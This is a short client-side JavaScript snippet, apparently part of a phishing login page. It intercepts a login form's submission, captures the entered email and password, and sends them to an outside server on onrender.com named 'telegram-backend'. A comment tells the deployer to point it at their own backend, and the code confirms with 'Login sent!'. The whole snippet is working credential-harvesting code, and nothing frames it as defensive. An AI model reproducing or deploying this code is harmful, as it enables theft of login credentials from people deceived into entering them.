<script>
document.getElementById('loginForm').addEventListener('submit', async function(e) {
  e.preventDefault();
  const username = document.getElementById('user_email').value;
  const password = document.getElementById('user_password').value;
  // CHANGE THIS to your backend API URL after you deploy it (step-by-step guide below)
  const apiUrl = 'https://telegram-backend-1oje.onrender.com';
  try {
    const res = await fetch(apiUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });
    const result = await res.json();
    if (result.success) {
      alert('Login sent!');
      // window.location.href = 'your-account.html'; // Optionally redirect
    } else {
      alert('Error: ' + (result.error || 'Unknown error'));
    }
  } catch (err) {
    alert('Failed to send. Try again.');
  }
});
</script>
